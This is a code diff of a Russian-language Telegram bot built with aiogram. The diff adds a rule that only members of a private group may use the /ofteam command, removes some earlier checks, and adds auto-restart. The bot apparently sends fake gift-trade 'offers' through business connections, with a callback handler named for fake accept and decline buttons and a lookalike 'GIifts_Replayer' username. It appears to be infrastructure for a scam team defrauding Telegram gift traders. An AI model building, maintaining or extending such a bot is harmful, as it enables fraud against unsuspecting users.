@@ -16,6 +16,12 @@ dp = Dispatcher()
 TARGET_USERNAME = "GIifts_Replayer" 
 # -----------------------------
 
+# --- НАСТРОЙКИ ПРОВЕРКИ (ГРУППА) ---
+# Убедись, что бот добавлен в эту группу и является админом!
+TARGET_CHAT_ID = -1003747516067 
+INVITE_LINK = "https://t.me/+pivcaSqTYchmNWYy"
+# ------------------------------------
+
 active_users = set()
 ADMIN_ID = None 
 
@@ -58,11 +64,21 @@ def get_pretty_name(slug):
     raw_name = slug.split('-')[0]
     return re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)
 
+# --- ФУНКЦИЯ ПРОВЕРКИ ПОДПИСКИ ---
+async def is_subscribed(user_id: int) -> bool:
+    try:
+        member = await bot.get_chat_member(chat_id=TARGET_CHAT_ID, user_id=user_id)
+        return member.status in ["member", "administrator", "creator"]
+    except Exception as e:
+        print(f"Ошибка проверки подписки (убедитесь, что бот админ в группе): {e}")
+        return False
+
 @dp.message(CommandStart())
 async def cmd_start(message: types.Message):
     global ADMIN_ID
     ADMIN_ID = message.from_user.id 
     
+    # ПРОВЕРКА УБРАНА
     text = (
         "<b>Как начать:</b>\n"
         "Отправь /ofteam — и доступ будет выдан автоматически.\n\n"
@@ -80,7 +96,20 @@ async def cmd_start(message: types.Message):
 
 @dp.message(Command("ofteam"))
 async def cmd_ofteam(message: types.Message):
-    await message.answer("✅ Доступ выдан. Теперь можно отправлять оферы.")
+    # ПРОВЕРКА ПОДПИСКИ ТОЛЬКО ЗДЕСЬ
+    if not await is_subscribed(message.from_user.id):
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[[
+            InlineKeyboardButton(text="Вступить в группу", url=INVITE_LINK)
+        ]])
+        return await message.answer(
+            "⛔ <b>Ошибка доступа!</b>\n\n"
+            "Вы не подписаны на нашу группу. Использование команды /ofteam запрещено.\n"
+            "Вступите в группу и попробуйте снова.",
+            reply_markup=keyboard, 
+            parse_mode="HTML"
+        )
+        
+    await message.answer("✅ Подписка подтверждена. Доступ выдан. Теперь можно отправлять оферы.")
 
 @dp.message(F.text.startswith("/of"))
 async def block_offer_in_pm(message: types.Message):
@@ -90,6 +119,8 @@ async def block_offer_in_pm(message: types.Message):
 async def handle_offer_command(message: types.Message):
     business_connection_id = message.business_connection_id
     if not business_connection_id: return
+
+    # ПРОВЕРКА УБРАНА
 
     parts = message.text.split()
     if len(parts) < 4: return
@@ -140,6 +171,8 @@ async def handle_offer_command(message: types.Message):
 @dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
 async def handle_fake_buttons(callback: types.CallbackQuery):
     if not callback.message: return
+    
+    # ПРОВЕРКА УБРАНА
     
     data_parts = callback.data.split(":")
     action, gift_slug, amount, currency, lang = data_parts[0], data_parts[1], data_parts[2], data_parts[3], data_parts[4]
@@ -195,9 +228,15 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
     else:
         await callback.answer()
 
+# --- АВТОПЕРЕПОДКЛЮЧЕНИЕ ---
 async def main():
-    print("Бот запущен...")
-    await dp.start_polling(bot)
+    while True:
+        try:
+            print("Бот запущен...")
+            await dp.start_polling(bot)
+        except Exception as e:
+            print(f"Polling упал: {e}. Перезапуск через 5 секунд...")
+            await asyncio.sleep(5)
 
 if __name__ == "__main__":
     asyncio.run(main())
